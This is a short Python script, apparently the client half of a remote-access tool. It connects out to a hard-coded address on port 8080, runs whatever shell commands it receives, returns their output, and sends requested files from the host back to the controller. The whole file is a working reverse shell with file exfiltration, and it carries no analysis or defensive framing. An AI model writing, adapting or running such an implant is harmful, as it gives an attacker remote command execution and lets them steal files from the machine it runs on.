#Download_Client Side

import socket
import subprocess
import os

#File Transfer Function

def transfer(s, path):
    if os.path.exists(path):
        with open(path, 'rb') as f:
            packet = f.read(1024)
            while len(packet) > 0:
                s.send(packet)
                packet = f.read(1024)
            s.send(b'DONE')
    else:
        s.send(b'Unable to find out the file')
    
    #Connection Function
def connecting():
    HOST = '192.168.43.85'
    PORT = 8080
    
    s = socket.socket()
    s.connect((HOST,PORT))
    
    while True:
        command = s.recv(1024)
        
        if b'terminate' in command:
            s.close()
            break
        
        elif b'download' in command:
            grab, path = command.decode().split(' ')
            
            try:
                transfer(s, path)
            except:
                pass
        else:
             CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s.send(CMD.stdout.read())
             s.send(CMD.stderr.read())
             
#Main Function 
def main():
    connecting()
main()